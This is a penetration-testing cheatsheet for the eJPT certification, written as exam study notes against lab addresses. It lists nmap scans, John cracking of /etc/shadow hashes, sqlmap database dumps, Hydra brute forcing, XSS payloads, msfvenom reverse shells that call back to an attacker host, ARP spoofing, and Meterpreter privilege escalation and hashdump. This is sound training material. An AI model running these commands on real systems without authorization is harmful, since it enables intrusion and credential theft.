# eJPT-Cheatsheet
This is a Cheatsheet for eJPT exam + course.

## Nmap
nmap -sn 10.10.10.0/24\
nmap -sV -p- -iL targets -oN nmap.initial -v\
nmap -A -p- -iL targets -oN nmap.aggressive -v\
nmap -p<port> --script=vuln -v <target-IP>

## fPing
fping -a -g 10.10.10.0/24 2>/dev/null > targets

## IP Route
**Syntax**\
ip route add \<Network-range\> via \<router-IP\> dev \<interface\>\
eg.\
ip route add 10.10.10.0/24 via 10.10.11.1 dev tap0

## John
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5\
unshadow passwd shadow > unshadowed.txt\
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

## dirb
dirb http://10.10.10.10/ \
dirb http://10.10.10.10/dir -u admin:admin

*I suggest you to use dirbuster for better speed. Keep the threads at 20. Use /usr/share/wordlists/dirb/common.txt wordlist.*

## Netcat
**Listening for reverse shell**\
nc -nvlp 1234

**Banner Grabbing**\
nc -nv 10.10.10.10 \<port\>

## SQLMap
#### Check if injection exists
sqlmap -r Post.req\
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id\
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"

#### Get database if injection Exists
sqlmap -r login.req --dbs\
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs\
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs\

#### Get Tables in a Database
sqlmap -r login.req -D dbname --tables\
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables\
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname --tables

#### Get data in a Database tables
sqlmap -r login.req -D dbname -T table_name --dump\
sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump\
sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump

## Hydra
**SSH Login Bruteforcing**\
hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 ssh\
hydra -v -V -u -l root -P passwords.txt -t 1 -u 10.10.10.10 ssh\
*You can use same for FTP, just replace ssh with ftp*

**HTTP POST Form**\
hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V

*You will know which wordlists to use when the time comes*


## XSS
\<script\>alert(1)\</script\>\
\<ScRiPt\>alert(1)\</ScRiPt\>

*This is a great filter bypass cheatsheet*\
https://owasp.org/www-community/xss-filter-evasion-cheatsheet

## msfvenom shells
**JSP Java Meterpreter Reverse TCP**\
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp

**WAR**\
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war

**PHP**\
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

## Metasploit Meterpreter autoroute
run autoroute -s 10.10.10.0/24

## ARPSpoof
echo 1 > /proc/sys/net/ipv4/ip_forward\
arpspoof -i <interface> -t <target> -r <host>\
arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36

## SMB Enumeration
**Get shares, users, groups, password policy**\
smbclient -L //10.10.10.10/\
enum4linux -U -M -S -P -G 10.10.10.10\
nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains 10.10.10.10 -p 135,139,445 -v\
nmap -p445 --script=smb-vuln-* 10.10.10.10 -v

**Access Share**\
smbclient //10.10.10.10/share_name

## FTP Enumeration
nmap --script=ftp-anon 10.10.10.10 -p21 -v\
nmap -A -p21 10.10.10.10 -v

**Login to FTP server**\
ftp 10.10.10.10

## Meterpreter
ps\
getuid\
getpid\
getsystem\
ps -U SYSTEM

**CHECK UAC/Privileges**\
run post/windows/gather/win_privs

**BYPASS UAC**\
*Background the session first*\
exploit/windows/local/bypassuac\
set session

**After PrivEsc**\
migrate \<pid\>\
hashdump
  
## Windows Command Line
**To search for a file starting from current directory**\
dir /b/s "\*.conf\*"\
dir /b/s "\*.txt\*"\
dir /b/s "\*filename\*"

**Check routing table**\
route print\
netstat -r

**Check Users**\
net users

**List drives on the machine**\
wmic logicaldisk get Caption,Description,providername


